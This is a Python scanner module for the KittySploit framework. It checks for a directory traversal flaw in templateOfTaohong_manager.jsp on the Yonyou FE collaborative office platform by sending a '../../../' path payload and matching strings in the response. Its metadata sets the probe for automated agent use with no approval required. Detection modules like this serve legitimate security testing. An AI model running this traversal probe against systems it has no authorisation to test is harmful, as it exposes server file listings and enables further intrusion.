#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is a directory traversal vulnerability in the templateOfTaohong_manager."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FE collaborative Office templateOfTaohong_manager.jsp - Path Traversal Detection',
        'description': 'There is a directory traversal vulnerability in the templateOfTaohong_manager.jsp file of UFIDA FE collaborative office platform. Through the vulnerability, attackers can obtain directory files and other information, leading to further attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'yonyou', 'fe', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20FE%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0%20templateOfTaohong_manager.jsp%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('window.location="templateOfTaohong_manager.jsp?path="', 'var next=window.confirm("确定删除文件吗？");',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="FE collaborative Office templateOfTaohong_manager.jsp - Path Traversal detected",
                path='/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../',
            )
            return True
        return False

